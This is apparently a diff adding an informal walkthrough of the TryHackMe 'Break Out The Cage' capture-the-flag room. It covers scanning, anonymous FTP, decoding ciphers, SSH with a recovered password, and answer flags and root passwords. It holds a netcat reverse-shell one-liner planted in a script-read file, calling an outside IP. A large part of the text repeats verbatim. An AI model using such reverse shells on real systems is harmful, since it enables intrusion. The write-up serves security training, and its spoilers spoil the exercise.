@@ -1,0 +1,330 @@
+hello guys it ALIEN here i was thinking of making a break the cage walkthough, its a tryhackme room ranked  (EASY), oky lets jump on the machine now.
+
+STEP 1: enumuration and target scanning (remember to start the machine and set a vpn on your machine)
+•  i just used a simple command: nmap  -sC -sV <target_ip> -oN nmap.txt
+
+
+
+From the scanning above it observed that there are 3 openning ports 
+1. ftp (21) which allow anonymous login
+2. ssh(22)
+3. http(80) which allows a simple webserver to run
+
+NB: I started with the ftp enumuration, it seems as if the ftp allows anonymous login, where u can just try to login as 
+
+username:anonymous
+password:blanck(no pass)
+
+When u login u will find a file try to download it because it contains some useful information  for us(the file contains some information but seems encoded in base 64).You can use any tool of your choise here
+
+when u decode the base64 , it the decoded msg seems also it encrypted in vigenere cipher u can use any tool of your choise also here
+
+
+After decoding the message we get these txt
+
+Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
+One. Revamp the website
+Two. Put more quotes in script
+Three. Buy bee pesticide
+Four. Help him with acting lessons
+Five. Teach Dad what "information security" is.
+
+In case I forget.... Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
+One. Revamp the website
+Two. Put more quotes in script
+Three. Buy bee pesticide
+Four. Help him with acting lessons
+Five. Teach Dad what "information security" is.
+
+In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
+
+• It seems as if we got the password here, lets try to find the username or the one whom own this password
+
+STEP2: Visit a web browser, it seems as if nicholas cage as a son named weston and he is the one who  host his fathers blog, ohooooooo this sound good now after this information lets try to make some exploitations here
+
+STEP 3: Exploitation
+ssh creds
+username:weston
+password:Mydadisghostrideraintthatcoolnocausehesonfirejokes
+
+NB: once we login, at the home directory we sees that weston added his dad as another user, so now we got two users here inside but can't login as cage(we have no passwd)
+
+STEP 4:LETS FIRST FIND A WAY TO BE ROOT SO AS WE  GET THE FLAG EASY
+in the home directory there two users
+user1:cage
+user2:weston(nothing i have found inside this user either any file )
+
+
+NB:since we dont have the password for the user1:cage hence we can not login 
+but since we have the password for the user weston lets see what he got so that he can run as a root without a password 
+
+check this one:-      commad:sudo -l
+User weston may run the following commands on national-treasure:
+    (root) /usr/bin/bees
+
+i tried in gtfobins(bees) but got nothing lets try to search other materials
+
+
+Lets try to find about  user:cage if he has anything on user:weston even if  it is a file 
+command:find / -type f -user cage 2>/dev/null
+
+OUTPUT:
+/opt/.dads_scripts/spread_the_quotes.py
+/opt/.dads_scripts/.files/.quotes
+
+• Lets try to get a reverse shell for the user cage since because we have no password for him , but we have the files that can help us to get his shell
+• 
+reverse shell(for cage)
+NB: you can change your directory (/tmp since because there is restriction of reading and writting in home directory)
+
+command: echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.15.35 4444 >/tmp/f' > .quotes
+
+
+finally we get a reverse shell for user cage: lets check what he got 
+
+user.txt:THM{M37AL_0R_P3N_T35T1NG}
+
+☐ lets check the email_backup directory
+there are 3 emails 
+
+email_1: from sean to cage
+
+From - SeanArcher@BigManAgents.com
+To - Cage@nationaltreasure.com
+
+Hey Cage!
+
+There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
+planning stages at the moment. I've put a good word in for you, if you're lucky we 
+might be able to get you a part of an angry shop keeping or something? Would you be up
+for that, the money would be good and it'd look good on your acting CV.
+
+Regards
+
+Sean Archer
+
+
+
+email_2:from cage to sean(i gues it a reply for the email sean sent to him prev)
+
+From - Cage@nationaltreasure.com
+To - SeanArcher@BigManAgents.com
+
+Dear Sean
+
+We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
+Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
+the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
+new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
+I could of made them great... great Sean.... I think you're missing my true potential.
+
+On a much lighter note thank you for helping me set up my home server, Weston helped too, but
+not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?
+
+Yours
+
+Cage
+
+NB: the last two lines mean something(root), lets check the last email maybe password for root
+
+email_3:from cage to his son(weston)
+From - Cage@nationaltreasure.com
+To - Weston@nationaltreasure.com
+
+Hey Son
+
+Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
+down what it said. Could you look into it please? I think it could be something to do with his
+account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
+sure he's out to get me. The note said:
+
+haiinspsyanileph
+
+The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
+was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
+hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
+ahahahhahaha. Ahhh Face it... he's just odd. 
+
+Regards
+
+The Legend - Cage
+
+
+NB: haiinspsyanileph(hidden message that sean has hide from cage but it seems as root password because email_2 talks about root user)
+
+BUT we dont have the key: mhmmmmmmmmmm maybe the  face(is a key mhmmmmmmmm !!!!!!!), YES ITS TRUE(cageisnotalegend(password for root))
+
+
+cd /root
+in the root directory we find two emails
+
+email_1:
+From - SeanArcher@BigManAgents.com
+To - master@ActorsGuild.com
+
+Good Evening Master
+
+My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
+Eventually the whole world will see who Cage really is! Our masterplan is coming together
+master, I'm in your debt.
+
+Thank you
+
+Sean Archer
+
+email_2:
+From - master@ActorsGuild.com
+To - SeanArcher@BigManAgents.com
+
+Dear Sean
+
+I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
+strong... so strong that I feel the power to promote you from disciple to crony. I hope you
+don't abuse your new found strength. To ascend yourself to this level please use this code:
+
+THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
+
+Thank you
+
+Sean Archer
+
+
+
+
+
+
+i tried in gtfobins but got nothing lets try to search other materials
+
+
+lets try to find what user:cage if he has anything on user:weston even if is a file 
+command:find / -type f -user cage 2>/dev/null
+
+OUTPUT:
+/opt/.dads_scripts/spread_the_quotes.py
+/opt/.dads_scripts/.files/.quotes
+
+reverse shell(for cage)
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.15.35 4444 >/tmp/f' > .quotes
+
+
+finally we get a reverse shell for user cage: lets check what he got 
+
+user.txt:THM{M37AL_0R_P3N_T35T1NG}
+
+lets check the email_backup directory
+there are 3 emails 
+
+email_1: from sean to cage
+
+From - SeanArcher@BigManAgents.com
+To - Cage@nationaltreasure.com
+
+Hey Cage!
+
+There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
+planning stages at the moment. I've put a good word in for you, if you're lucky we 
+might be able to get you a part of an angry shop keeping or something? Would you be up
+for that, the money would be good and it'd look good on your acting CV.
+
+Regards
+
+Sean Archer
+
+
+
+email_2:from cage to sean(i gues it a reply for the email sean sent to him prev)
+
+From - Cage@nationaltreasure.com
+To - SeanArcher@BigManAgents.com
+
+Dear Sean
+
+We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
+Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
+the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
+new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
+I could of made them great... great Sean.... I think you're missing my true potential.
+
+On a much lighter note thank you for helping me set up my home server, Weston helped too, but
+not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?
+
+Yours
+
+Cage
+
+NB: the last two lines mean something(root), lets check the last email maybe password for root
+
+email_3:from cage to his son(weston)
+From - Cage@nationaltreasure.com
+To - Weston@nationaltreasure.com
+
+Hey Son
+
+Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
+down what it said. Could you look into it please? I think it could be something to do with his
+account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
+sure he's out to get me. The note said:
+
+haiinspsyanileph
+
+The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
+was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
+hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
+ahahahhahaha. Ahhh Face it... he's just odd. 
+
+Regards
+
+The Legend - Cage
+
+
+NB: haiinspsyanileph(hidden message that sean has hide from cage but it seems as root password because email2 talks about root user)
+
+BUT we dont have the key: mhmmmmmmmmmm maybe face(is a key mhmmmmmmmm !!!!!!!), YES ITS TRUE(cageisnotalegend(password for root))
+
+
+cd /root
+in the root directory we find two emails
+
+email_1:
+From - SeanArcher@BigManAgents.com
+To - master@ActorsGuild.com
+
+Good Evening Master
+
+My control over Cage is becoming stronger, I've been casting him into worse and worse roles.
+Eventually the whole world will see who Cage really is! Our masterplan is coming together
+master, I'm in your debt.
+
+Thank you
+
+Sean Archer
+
+email_2:
+From - master@ActorsGuild.com
+To - SeanArcher@BigManAgents.com
+
+Dear Sean
+
+I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
+strong... so strong that I feel the power to promote you from disciple to crony. I hope you
+don't abuse your new found strength. To ascend yourself to this level please use this code:
+
+THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
+
+Thank you
+
+Sean Archer
+
+
+
+
+
+
+
+
+
+
+
+
+
+
